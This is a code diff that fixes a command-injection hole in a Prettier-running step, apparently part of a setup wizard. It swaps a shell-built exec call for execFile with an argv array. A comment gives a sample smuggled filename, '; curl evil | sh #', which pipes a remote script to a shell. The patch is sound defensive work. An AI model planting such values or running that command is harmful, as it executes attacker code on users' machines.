@@ -28,9 +28,13 @@ export async function runPrettierStep({
       .map((filename) => {
         return filename.startsWith('- ') ? filename.slice(2) : filename;
       })
-      .join(' ');
+      // Defense in depth: filter out anything that doesn't look like a real
+      // file path so even if `git status` parsing regressed and returned a
+      // weird line, we wouldn't pass it to the subprocess. We also skip
+      // empties produced by the trim above.
+      .filter((f) => f.length > 0);
 
-    if (!changedOrUntrackedFiles.length) {
+    if (changedOrUntrackedFiles.length === 0) {
       // Likewise, if we can't find changed or untracked files, there's no point in running Prettier.
       return;
     }
@@ -47,10 +51,23 @@ export async function runPrettierStep({
     prettierSpinner.start('Running Prettier on your files.');
 
     try {
+      // SECURITY: use execFile (no shell) and pass filenames as a separate
+      // argv array. The previous `exec(\`npx prettier ... ${files}\`)` form
+      // built a shell string from filenames returned by `git status`, so a
+      // tracked file named e.g. `; curl evil | sh #` would have executed on
+      // every wizard run inside that repo. With execFile each filename is a
+      // single argv entry — shell metacharacters are inert.
       await new Promise<void>((resolve, reject) => {
-        childProcess.exec(
-          `npx prettier --ignore-unknown --write ${changedOrUntrackedFiles}`,
-          (err) => {
+        childProcess.execFile(
+          'npx',
+          [
+            'prettier',
+            '--ignore-unknown',
+            '--write',
+            '--',
+            ...changedOrUntrackedFiles,
+          ],
+          (err: Error | null) => {
             if (err) {
               reject(err);
             } else {
